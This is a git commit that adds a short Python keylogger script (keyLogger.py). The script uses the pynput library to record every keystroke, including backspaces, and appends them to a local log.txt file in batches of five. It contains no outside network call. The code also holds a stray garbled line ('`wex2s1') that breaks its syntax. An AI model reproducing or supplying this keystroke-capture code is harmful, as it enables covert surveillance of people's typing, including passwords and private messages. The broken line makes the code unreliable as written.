36418362df292f721eb4d670d744b7c1d9711c6a
Ahmed Faid <afaid@uwo.ca>
2020-01-06 17:49:44 -0800

    intial commit

---
+++ venv/keyLogger.py
@@ -0,0 +1,34 @@
+import pynput
+
+from pynput.keyboard import Key, Listener
+
+keys = []
+count = 0
+
+def on_press(key):
+    global keys, count
+
+    if key == Key.backspace:
+        key = "BKS"
+    keys.append(key)
+    count = count +1
+    if count >= 5:
+        keyLog()
+
+
+def on_release(key):
+    if key==Key.esc:
+        return False
+
+def keyLog():
+    global keys, count
+    with open("log.txt", "a") as file:
+        for key in keys:
+            file.write(str(key))
+        count = 0
+        keys=[]
+    `wex2s1
+
+
+with Listener (on_press=on_press, on_release=on_release) as listener:
+    listener.join()
